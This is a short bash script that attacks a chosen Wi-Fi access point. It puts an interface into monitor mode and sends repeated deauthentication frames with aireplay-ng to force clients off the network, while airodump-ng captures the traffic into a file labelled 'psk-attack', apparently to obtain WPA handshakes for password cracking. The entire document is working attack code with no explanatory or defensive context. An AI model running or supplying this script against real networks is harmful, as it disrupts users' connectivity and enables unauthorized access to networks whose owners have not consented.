#!/bin/bash

BSSID=$1
CHANNEL=$2
DUMP_DIRECTORY=~/airodump_traces/networks/$BSSID
PAUSE=60
IFACE=wlan1
IFACEMON=wlan1mon

deauth() {
    aireplay-ng -0 100 -a $BSSID wlan1mon
}


set -x

if [ ! -d "$DUMP_DIRECTORY" ]; then
    mkdir -p "$DUMP_DIRECTORY"
fi

ifdown $IFACE
airmon-ng start $IFACE $CHANNEL
deauth &
airodump-ng -w $DUMP_DIRECTORY/psk-attack --bssid $BSSID -c $CHANNEL $IFACEMON
airmon-ng stop $IFACEMON
ifup $IFACE

